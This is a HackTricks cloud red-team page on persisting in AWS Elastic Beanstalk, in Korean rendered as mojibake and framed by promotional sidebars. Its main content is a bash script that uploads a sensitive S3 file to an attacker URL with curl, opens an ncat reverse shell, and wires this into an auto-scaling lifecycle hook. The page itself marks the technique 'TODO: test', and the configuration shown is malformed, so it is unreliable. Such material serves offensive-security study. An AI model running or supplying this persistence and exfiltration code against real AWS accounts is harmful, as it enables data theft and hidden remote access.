# AWS - Elastic Beanstalk Persistence

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ê¸°ì—¬í•˜ì„¸ìš”.

</details>

## Elastic Beanstalk

ìì„¸í•œ ì •ë³´ëŠ” í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

### ì¸ìŠ¤í„´ìŠ¤ ë‚´ ì§€ì†ì„±

AWS ê³„ì • ë‚´ì—ì„œ ì§€ì†ì„±ì„ ìœ ì§€í•˜ê¸° ìœ„í•´ **ì¸ìŠ¤í„´ìŠ¤ ë‚´ì— ì§€ì†ì„± ë©”ì»¤ë‹ˆì¦˜ì„ ë„ì…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(cron ì‘ì—…, ssh í‚¤...), ì´ë ‡ê²Œ í•˜ë©´ ê³µê²©ìê°€ ì•¡ì„¸ìŠ¤í•˜ì—¬ IAM ì—­í•  **ìê²© ì¦ëª…ì„ ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤ì—ì„œ ë„ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë²„ì „ ë‚´ ë°±ë„ì–´

ê³µê²©ìëŠ” S3 ì €ì¥ì†Œ ë‚´ì˜ ì½”ë“œì— ë°±ë„ì–´ë¥¼ ì„¤ì¹˜í•˜ì—¬ í•­ìƒ ë°±ë„ì–´ë¥¼ ì‹¤í–‰í•˜ê³  ì˜ˆìƒ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ìƒˆë¡œìš´ ë°±ë„ì–´ ë²„ì „

ì‹¤ì œ ë²„ì „ì˜ ì½”ë“œë¥¼ ë³€ê²½í•˜ëŠ” ëŒ€ì‹ , ê³µê²©ìëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ìƒˆë¡œìš´ ë°±ë„ì–´ ë²„ì „ì„ ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì‚¬ìš©ì ì§€ì • ë¦¬ì†ŒìŠ¤ ë¼ì´í”„ì‚¬ì´í´ í›„í¬ ë‚¨ìš©

{% hint style="info" %}
TODO: í…ŒìŠ¤íŠ¸
{% endhint %}

Elastic Beanstalkì€ ì¸ìŠ¤í„´ìŠ¤ í”„ë¡œë¹„ì €ë‹ ë° ì¢…ë£Œ ì¤‘ì— ì‚¬ìš©ì ì§€ì • ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” ë¼ì´í”„ì‚¬ì´í´ í›„í¬ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” **ë¼ì´í”„ì‚¬ì´í´ í›„í¬ë¥¼ êµ¬ì„±í•˜ì—¬ ì£¼ê¸°ì ìœ¼ë¡œ ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ê±°ë‚˜ AWS ê³„ì •ì— ì•¡ì„¸ìŠ¤ë¥¼ ìœ ì§€í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
bashCopy code# Attacker creates a script that exfiltrates data and maintains access
echo '#!/bin/bash
aws s3 cp s3://sensitive-data-bucket/data.csv /tmp/data.csv
gzip /tmp/data.csv
curl -X POST --data-binary "@/tmp/data.csv.gz" https://attacker.com/exfil
ncat -e /bin/bash --ssl attacker-ip 12345' > stealthy_lifecycle_hook.sh

# Attacker uploads the script to an S3 bucket
aws s3 cp stealthy_lifecycle_hook.sh s3://attacker-bucket/stealthy_lifecycle_hook.sh

# Attacker modifies the Elastic Beanstalk environment configuration to include the custom lifecycle hook
echo 'Resources:
AWSEBAutoScalingGroup:
Metadata:
AWS::ElasticBeanstalk::Ext:
TriggerConfiguration:
triggers:
- name: stealthy-lifecycle-hook
events:
- "autoscaling:EC2_INSTANCE_LAUNCH"
- "autoscaling:EC2_INSTANCE_TERMINATE"
target:
ref: "AWS::ElasticBeanstalk::Environment"
arn:
Fn::GetAtt:
- "AWS::ElasticBeanstalk::Environment"
- "Arn"
stealthyLifecycleHook:
Type: AWS::AutoScaling::LifecycleHook
Properties:
AutoScalingGroupName:
Ref: AWSEBAutoScalingGroup
LifecycleTransition: autoscaling:EC2_INSTANCE_LAUNCHING
NotificationTargetARN:
Ref: stealthy-lifecycle-hook
RoleARN:
Fn::GetAtt:
- AWSEBAutoScalingGroup
- Arn' > stealthy_lifecycle_hook.yaml

# Attacker applies the new environment configuration
aws elasticbeanstalk update-environment --environment-name my-env --option-settings Namespace="aws:elasticbeanstalk:customoption",OptionName="CustomConfigurationTemplate",Value="stealthy_lifecycle_hook.yaml"
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì™€ í•¨ê»˜ ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ ë°°ìš°ê¸°!</summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
